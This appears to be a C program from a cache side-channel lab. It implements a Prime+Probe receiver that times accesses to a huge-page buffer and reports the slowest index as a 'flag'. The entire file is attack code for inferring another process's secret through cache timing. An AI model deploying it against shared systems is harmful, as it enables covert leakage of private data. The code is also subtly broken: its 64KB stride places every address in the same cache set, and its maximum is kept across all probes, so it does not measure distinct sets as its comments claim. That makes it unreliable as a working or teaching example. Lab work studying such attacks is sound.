#include "util.h"
#include <sys/mman.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#define BUFF_SIZE (128*1024*1024) // 128MB buffer
#define CACHE_LINE 64
#define NUM_SETS 1024
#define NUM_PROBES 10           // number of times to measure

int main(int argc, char const *argv[]) {

    int flag = -1;

    char *buf = mmap(NULL, BUFF_SIZE,
                     PROT_READ | PROT_WRITE,
                     MAP_POPULATE | MAP_ANONYMOUS |
                     MAP_PRIVATE | MAP_HUGETLB,
                     -1, 0);

    if (buf == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    buf[0] = 1;

    char *set_addr[NUM_SETS];
    uint64_t times[NUM_SETS];

    for (int i = 0; i < NUM_SETS; i++) {
        set_addr[i] = buf + i * 65536;  // spacing addresses for cache sets
    }

    uint64_t max_time = 0;

    for (int probe = 0; probe < NUM_PROBES; probe++) {

        // PRIME: touch all addresses to fill cache
        for (int i = 0; i < NUM_SETS; i++)
            *(volatile char*)set_addr[i];

        // Small delay
        for (volatile int i = 0; i < 100000; i++);

        // PROBE: measure access times
        for (int i = 0; i < NUM_SETS; i++) {
            uint64_t t = measure_one_block_access_time((ADDR_PTR)set_addr[i]);
            times[i] = t;  // optional: store all for debugging

            if (t > max_time) {
                max_time = t;
                flag = i;
            }
        }
    }

    printf("Flag: %d\n", flag);

    return 0;
}